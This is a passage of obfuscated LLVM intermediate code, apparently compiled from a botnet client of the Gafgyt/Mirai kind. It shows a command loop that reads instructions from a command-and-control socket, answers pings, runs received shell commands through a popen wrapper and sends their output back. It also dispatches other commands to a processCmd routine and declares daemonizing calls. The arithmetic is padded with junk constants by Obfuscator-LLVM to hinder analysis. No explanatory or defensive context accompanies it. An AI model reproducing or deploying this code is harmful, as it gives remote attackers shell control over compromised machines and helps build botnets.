  call void @trim(i8* %349)
  %350 = getelementptr inbounds [4096 x i8], [4096 x i8]* %21, i32 0, i32 0
  %351 = call i8* @strstr(i8* %350, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.309, i32 0, i32 0)) #10
  %352 = getelementptr inbounds [4096 x i8], [4096 x i8]* %21, i32 0, i32 0
  %353 = icmp eq i8* %351, %352
  br i1 %353, label %354, label %357

; <label>:354:                                    ; preds = %345
  %355 = load i32, i32* @mainCommSock, align 4
  %356 = call i32 (i32, i8*, ...) @sockprintf(i32 %355, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.486, i32 0, i32 0))
  br label %242

; <label>:357:                                    ; preds = %345
  %358 = getelementptr inbounds [4096 x i8], [4096 x i8]* %21, i32 0, i32 0
  %359 = call i8* @strstr(i8* %358, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.487, i32 0, i32 0)) #10
  %360 = getelementptr inbounds [4096 x i8], [4096 x i8]* %21, i32 0, i32 0
  %361 = icmp eq i8* %359, %360
  br i1 %361, label %362, label %373

; <label>:362:                                    ; preds = %357
  %363 = load i32, i32* %12, align 4
  %364 = add i32 %363, 568686437
  %365 = add i32 %364, 1
  %366 = sub i32 %365, 568686437
  %367 = add nsw i32 %363, 1
  store i32 %366, i32* %12, align 4
  %368 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.488, i32 0, i32 0))
  %369 = load i32, i32* %12, align 4
  %370 = icmp sgt i32 %369, 20
  br i1 %370, label %371, label %372

; <label>:371:                                    ; preds = %362
  call void @exit(i32 0) #14
  unreachable

; <label>:372:                                    ; preds = %362
  br label %584

; <label>:373:                                    ; preds = %357
  %374 = getelementptr inbounds [4096 x i8], [4096 x i8]* %21, i32 0, i32 0
  store i8* %374, i8** %26, align 8
  %375 = load i8*, i8** %26, align 8
  %376 = load i8, i8* %375, align 1
  %377 = zext i8 %376 to i32
  %378 = icmp eq i32 %377, 33
  br i1 %378, label %379, label %583

; <label>:379:                                    ; preds = %373
  %380 = load i8*, i8** %26, align 8
  %381 = getelementptr inbounds i8, i8* %380, i64 1
  store i8* %381, i8** %27, align 8
  br label %382

; <label>:382:                                    ; preds = %394, %379
  %383 = load i8*, i8** %27, align 8
  %384 = load i8, i8* %383, align 1
  %385 = zext i8 %384 to i32
  %386 = icmp ne i32 %385, 32
  br i1 %386, label %387, label %392

; <label>:387:                                    ; preds = %382
  %388 = load i8*, i8** %27, align 8
  %389 = load i8, i8* %388, align 1
  %390 = zext i8 %389 to i32
  %391 = icmp ne i32 %390, 0
  br label %392

; <label>:392:                                    ; preds = %387, %382
  %393 = phi i1 [ false, %382 ], [ %391, %387 ]
  br i1 %393, label %394, label %397

; <label>:394:                                    ; preds = %392
  %395 = load i8*, i8** %27, align 8
  %396 = getelementptr inbounds i8, i8* %395, i32 1
  store i8* %396, i8** %27, align 8
  br label %382

; <label>:397:                                    ; preds = %392
  %398 = load i8*, i8** %27, align 8
  %399 = load i8, i8* %398, align 1
  %400 = zext i8 %399 to i32
  %401 = icmp eq i32 %400, 0
  br i1 %401, label %402, label %403

; <label>:402:                                    ; preds = %397
  br label %242

; <label>:403:                                    ; preds = %397
  %404 = load i8*, i8** %27, align 8
  store i8 0, i8* %404, align 1
  %405 = load i8*, i8** %26, align 8
  %406 = getelementptr inbounds i8, i8* %405, i64 1
  store i8* %406, i8** %27, align 8
  %407 = load i8*, i8** %26, align 8
  %408 = load i8*, i8** %27, align 8
  %409 = call i64 @strlen(i8* %408) #10
  %410 = getelementptr inbounds i8, i8* %407, i64 %409
  %411 = getelementptr inbounds i8, i8* %410, i64 2
  store i8* %411, i8** %26, align 8
  br label %412

; <label>:412:                                    ; preds = %438, %403
  %413 = load i8*, i8** %26, align 8
  %414 = load i8*, i8** %26, align 8
  %415 = call i64 @strlen(i8* %414) #10
  %416 = add i64 %415, 1893739521461257095
  %417 = sub i64 %416, 1
  %418 = sub i64 %417, 1893739521461257095
  %419 = sub i64 %415, 1
  %420 = getelementptr inbounds i8, i8* %413, i64 %418
  %421 = load i8, i8* %420, align 1
  %422 = zext i8 %421 to i32
  %423 = icmp eq i32 %422, 10
  br i1 %423, label %436, label %424

; <label>:424:                                    ; preds = %412
  %425 = load i8*, i8** %26, align 8
  %426 = load i8*, i8** %26, align 8
  %427 = call i64 @strlen(i8* %426) #10
  %428 = add i64 %427, -2357865099146670515
  %429 = sub i64 %428, 1
  %430 = sub i64 %429, -2357865099146670515
  %431 = sub i64 %427, 1
  %432 = getelementptr inbounds i8, i8* %425, i64 %430
  %433 = load i8, i8* %432, align 1
  %434 = zext i8 %433 to i32
  %435 = icmp eq i32 %434, 13
  br label %436

; <label>:436:                                    ; preds = %424, %412
  %437 = phi i1 [ true, %412 ], [ %435, %424 ]
  br i1 %437, label %438, label %447

; <label>:438:                                    ; preds = %436
  %439 = load i8*, i8** %26, align 8
  %440 = load i8*, i8** %26, align 8
  %441 = call i64 @strlen(i8* %440) #10
  %442 = add i64 %441, -1708353922971650412
  %443 = sub i64 %442, 1
  %444 = sub i64 %443, -1708353922971650412
  %445 = sub i64 %441, 1
  %446 = getelementptr inbounds i8, i8* %439, i64 %444
  store i8 0, i8* %446, align 1
  br label %412

; <label>:447:                                    ; preds = %436
  %448 = load i8*, i8** %26, align 8
  store i8* %448, i8** %28, align 8
  br label %449

; <label>:449:                                    ; preds = %461, %447
  %450 = load i8*, i8** %26, align 8
  %451 = load i8, i8* %450, align 1
  %452 = zext i8 %451 to i32
  %453 = icmp ne i32 %452, 32
  br i1 %453, label %454, label %459

; <label>:454:                                    ; preds = %449
  %455 = load i8*, i8** %26, align 8
  %456 = load i8, i8* %455, align 1
  %457 = zext i8 %456 to i32
  %458 = icmp ne i32 %457, 0
  br label %459

; <label>:459:                                    ; preds = %454, %449
  %460 = phi i1 [ false, %449 ], [ %458, %454 ]
  br i1 %460, label %461, label %464

; <label>:461:                                    ; preds = %459
  %462 = load i8*, i8** %26, align 8
  %463 = getelementptr inbounds i8, i8* %462, i32 1
  store i8* %463, i8** %26, align 8
  br label %449

; <label>:464:                                    ; preds = %459
  %465 = load i8*, i8** %26, align 8
  store i8 0, i8* %465, align 1
  %466 = load i8*, i8** %26, align 8
  %467 = getelementptr inbounds i8, i8* %466, i32 1
  store i8* %467, i8** %26, align 8
  %468 = load i8*, i8** %28, align 8
  store i8* %468, i8** %29, align 8
  br label %469

; <label>:469:                                    ; preds = %473, %464
  %470 = load i8*, i8** %29, align 8
  %471 = load i8, i8* %470, align 1
  %472 = icmp ne i8 %471, 0
  br i1 %472, label %473, label %482

; <label>:473:                                    ; preds = %469
  %474 = load i8*, i8** %29, align 8
  %475 = load i8, i8* %474, align 1
  %476 = zext i8 %475 to i32
  %477 = call i32 @toupper(i32 %476) #10
  %478 = trunc i32 %477 to i8
  %479 = load i8*, i8** %29, align 8
  store i8 %478, i8* %479, align 1
  %480 = load i8*, i8** %29, align 8
  %481 = getelementptr inbounds i8, i8* %480, i32 1
  store i8* %481, i8** %29, align 8
  br label %469

; <label>:482:                                    ; preds = %469
  %483 = load i8*, i8** %28, align 8
  %484 = call i32 @strcmp(i8* %483, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.489, i32 0, i32 0)) #10
  %485 = icmp eq i32 %484, 0
  br i1 %485, label %486, label %512

; <label>:486:                                    ; preds = %482
  %487 = call i32 @listFork()
  %488 = icmp ne i32 %487, 0
  br i1 %488, label %489, label %490

; <label>:489:                                    ; preds = %486
  br label %242

; <label>:490:                                    ; preds = %486
  %491 = getelementptr inbounds [1024 x i8], [1024 x i8]* %30, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %491, i8 0, i64 1024, i32 16, i1 false)
  %492 = getelementptr inbounds [1024 x i8], [1024 x i8]* %30, i32 0, i32 0
  %493 = load i8*, i8** %26, align 8
  %494 = call i32 (i8*, i8*, ...) @szprintf(i8* %492, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.490, i32 0, i32 0), i8* %493)
  %495 = getelementptr inbounds [1024 x i8], [1024 x i8]* %30, i32 0, i32 0
  %496 = call i32 @fdpopen(i8* %495, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.419, i32 0, i32 0))
  store i32 %496, i32* %31, align 4
  br label %497

; <label>:497:                                    ; preds = %502, %490
  %498 = getelementptr inbounds [1024 x i8], [1024 x i8]* %30, i32 0, i32 0
  %499 = load i32, i32* %31, align 4
  %500 = call i8* @fdgets(i8* %498, i32 1024, i32 %499)
  %501 = icmp ne i8* %500, null
  br i1 %501, label %502, label %509

; <label>:502:                                    ; preds = %497
  %503 = getelementptr inbounds [1024 x i8], [1024 x i8]* %30, i32 0, i32 0
  call void @trim(i8* %503)
  %504 = load i32, i32* @mainCommSock, align 4
  %505 = getelementptr inbounds [1024 x i8], [1024 x i8]* %30, i32 0, i32 0
  %506 = call i32 (i32, i8*, ...) @sockprintf(i32 %504, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.491, i32 0, i32 0), i8* %505)
  %507 = getelementptr inbounds [1024 x i8], [1024 x i8]* %30, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %507, i8 0, i64 1024, i32 16, i1 false)
  %508 = call i32 @sleep(i32 1)
  br label %497

; <label>:509:                                    ; preds = %497
  %510 = load i32, i32* %31, align 4
  %511 = call i32 @fdpclose(i32 %510)
  call void @exit(i32 0) #14
  unreachable

; <label>:512:                                    ; preds = %482
  store i32 1, i32* %33, align 4
  %513 = load i8*, i8** %26, align 8
  %514 = call i8* @strtok(i8* %513, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.303, i32 0, i32 0)) #2
  store i8* %514, i8** %34, align 8
  %515 = load i8*, i8** %28, align 8
  %516 = getelementptr inbounds [10 x i8*], [10 x i8*]* %32, i64 0, i64 0
  store i8* %515, i8** %516, align 16
  br label %517

; <label>:517:                                    ; preds = %558, %512
  %518 = load i8*, i8** %34, align 8
  %519 = icmp ne i8* %518, null
  br i1 %519, label %520, label %560

; <label>:520:                                    ; preds = %517
  %521 = load i8*, i8** %34, align 8
  %522 = load i8, i8* %521, align 1
  %523 = zext i8 %522 to i32
  %524 = icmp ne i32 %523, 10
  br i1 %524, label %525, label %558

; <label>:525:                                    ; preds = %520
  %526 = load i8*, i8** %34, align 8
  %527 = call i64 @strlen(i8* %526) #10
  %528 = sub i64 %527, 9003906852660379002
  %529 = add i64 %528, 1
  %530 = add i64 %529, 9003906852660379002
  %531 = add i64 %527, 1
  %532 = call noalias i8* @malloc(i64 %530) #2
  %533 = load i32, i32* %33, align 4
  %534 = sext i32 %533 to i64
  %535 = getelementptr inbounds [10 x i8*], [10 x i8*]* %32, i64 0, i64 %534
  store i8* %532, i8** %535, align 8
  %536 = load i32, i32* %33, align 4
  %537 = sext i32 %536 to i64
  %538 = getelementptr inbounds [10 x i8*], [10 x i8*]* %32, i64 0, i64 %537
  %539 = load i8*, i8** %538, align 8
  %540 = load i8*, i8** %34, align 8
  %541 = call i64 @strlen(i8* %540) #10
  %542 = sub i64 0, %541
  %543 = sub i64 0, 1
  %544 = add i64 %542, %543
  %545 = sub i64 0, %544
  %546 = add i64 %541, 1
  call void @llvm.memset.p0i8.i64(i8* %539, i8 0, i64 %545, i32 1, i1 false)
  %547 = load i32, i32* %33, align 4
  %548 = sext i32 %547 to i64
  %549 = getelementptr inbounds [10 x i8*], [10 x i8*]* %32, i64 0, i64 %548
  %550 = load i8*, i8** %549, align 8
  %551 = load i8*, i8** %34, align 8
  %552 = call i8* @strcpy(i8* %550, i8* %551) #2
  %553 = load i32, i32* %33, align 4
  %554 = sub i32 %553, -869230566
  %555 = add i32 %554, 1
  %556 = add i32 %555, -869230566
  %557 = add nsw i32 %553, 1
  store i32 %556, i32* %33, align 4
  br label %558

; <label>:558:                                    ; preds = %525, %520
  %559 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.303, i32 0, i32 0)) #2
  store i8* %559, i8** %34, align 8
  br label %517

; <label>:560:                                    ; preds = %517
  %561 = load i32, i32* %33, align 4
  %562 = getelementptr inbounds [10 x i8*], [10 x i8*]* %32, i32 0, i32 0
  call void @processCmd(i32 %561, i8** %562)
  %563 = load i32, i32* %33, align 4
  %564 = icmp sgt i32 %563, 1
  br i1 %564, label %565, label %582

; <label>:565:                                    ; preds = %560
  store i32 1, i32* %35, align 4
  store i32 1, i32* %35, align 4
  br label %566

; <label>:566:                                    ; preds = %575, %565
  %567 = load i32, i32* %35, align 4
  %568 = load i32, i32* %33, align 4
  %569 = icmp slt i32 %567, %568
  br i1 %569, label %570, label %581

; <label>:570:                                    ; preds = %566
  %571 = load i32, i32* %35, align 4
  %572 = sext i32 %571 to i64
  %573 = getelementptr inbounds [10 x i8*], [10 x i8*]* %32, i64 0, i64 %572
  %574 = load i8*, i8** %573, align 8
  call void @free(i8* %574) #2
  br label %575

; <label>:575:                                    ; preds = %570
  %576 = load i32, i32* %35, align 4
  %577 = sub i32 %576, 1170794881
  %578 = add i32 %577, 1
  %579 = add i32 %578, 1170794881
  %580 = add nsw i32 %576, 1
  store i32 %579, i32* %35, align 4
  br label %566

; <label>:581:                                    ; preds = %566
  br label %582

; <label>:582:                                    ; preds = %581, %560
  br label %583

; <label>:583:                                    ; preds = %582, %373
  br label %242

; <label>:584:                                    ; preds = %372, %242
  br label %231
                                                  ; No predecessors!
  %586 = load i32, i32* %3, align 4
  ret i32 %586
}

declare i32 @umask(...) #3

; Function Attrs: nounwind
declare i32 @setsid() #4

; Function Attrs: nounwind
declare i32 @chdir(i8*) #4

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #4

; Function Attrs: nounwind
declare i8* @getcwd(i8*, i64) #4

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE*) #4

; Function Attrs: nounwind readonly
declare i32 @strcasecmp(i8*, i8*) #1

declare i32 @fputs(i8*, %struct._IO_FILE*) #3

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #4

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind readonly }
attributes #11 = { nounwind returns_twice }
attributes #12 = { noreturn }
attributes #13 = { nounwind readnone }
attributes #14 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146541122}
!2 = !{i32 -2146540429}
!3 = !{i32 -2146539624}
!4 = !{i32 -2146538867}
!5 = !{i32 -2146538147}
!6 = !{i32 -2146537205}
!7 = !{i32 -2146535726}
!8 = !{i32 -2146535009}
!9 = !{i32 -2146534171}
